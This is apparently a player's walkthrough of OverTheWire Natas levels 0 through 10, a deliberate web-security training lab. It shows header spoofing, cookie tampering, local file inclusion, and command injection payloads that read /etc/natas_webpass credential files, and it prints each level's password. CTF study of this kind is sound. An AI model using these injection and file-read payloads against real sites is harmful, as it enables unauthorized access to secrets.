https://overthewire.org/wargames/natas/

<h1>level0:</h1>

visiting http://natas0.natas.labs.overthewire.org/

inspect and found the password as a comment 
```
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto-->
```


<h1>level1:</h1>

visiting http://natas1.natas.labs.overthewire.org/

right click was disabled so **ctl+shift+i**
```
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi-->
```


<h1>level2:</h1>

visiting http://natas2.natas.labs.overthewire.org/

inspected source code and found /files/pixel.png then went to /files/ which lead to http://natas2.natas.labs.overthewire.org/files/users.txt 
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```


<h1>level3:</h1>

visiting http://natas3.natas.labs.overthewire.org/

since it said google wont get it in the inspect source as a comment, that means robots.txt
on http://natas3.natas.labs.overthewire.org/robots.txt
```
User-agent: *
Disallow: /s3cr3t/
```
went to http://natas3.natas.labs.overthewire.org/s3cr3t/ and then to http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```


<h1>level4:</h1>

visiting http://natas4.natas.labs.overthewire.org/
via burpsuite i added this header in the request 
```
Referer: http://natas5.natas.labs.overthewire.org/
```
resulted in
```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```


<h1>level5:</h1>

visiting http://natas5.natas.labs.overthewire.org/

in inspect code > storage i changed the cookie loggedin:0 to loggedin:1 and refreshed the page 
```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```



<h1>level6:</h1>

visiting http://natas6.natas.labs.overthewire.org/

in http://natas6.natas.labs.overthewire.org/index-source.html i found the /includes/secret.inc path so i went http://natas6.natas.labs.overthewire.org/includes/secret.inc 
but nothing was there, so i inspected the page 
```
?
$secret = "FOEIUWGHFEEUHOFUOIU";
?
```
submit it and 
```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
```


<h1>level7:</h1>

visiting natas7.natas.labs.overthewire.org
```
hint: password for webuser natas8 is in /etc/natas_webpass/natas8 
```
clicking at **home** and **about** gave us the parameter **?page=** so paste that path there
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

```
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```


<h1>level8:</h1>

visiting natas8.natas.labs.overthewire.org

in http://natas8.natas.labs.overthewire.org/index-source.html
```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
```
first i used [cipher identifier](https://www.boxentriq.com/code-breaking/cipher-identifier) which said hex so decoded from hex in [cyberchef](https://gchq.github.io/CyberChef) **==QcCtmMml1ViV3b** and reversed it in https://codebeautify.org/reverse-string that gave **b3ViV1lmMmtCcQ==** then decoded from base64 **oubWYf2kBq** and submitted it
```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl 
```



<h1>level9:</h1>

visiting natas9.natas.labs.overthewire.org

first i submitted "needle" and gave me a bunch of words containing "needle" then i tried http://natas9.natas.labs.overthewire.org/?needle=*&submit=Search and gave me all of the file this meant that its executing it
since all password stored in **/etc/natas_webpass** then http://natas9.natas.labs.overthewire.org/?needle=*|cat%20/etc/natas_webpass/natas10&submit=Search
```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```



<h1>level10:</h1>

visiting natas10.natas.labs.overthewire.org

http://natas10.natas.labs.overthewire.org/index-source.html is filtering some symbols, so i tried 
```
* /etc/natas_webpass/natas11
```
that didnt work but i saw a writeup that added a dot and that worked
```
.* /etc/natas_webpass/natas11
```
or a new line encoded in URL
```
%0Acat /etc/natas_webpass/natas11
```
gave
```
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

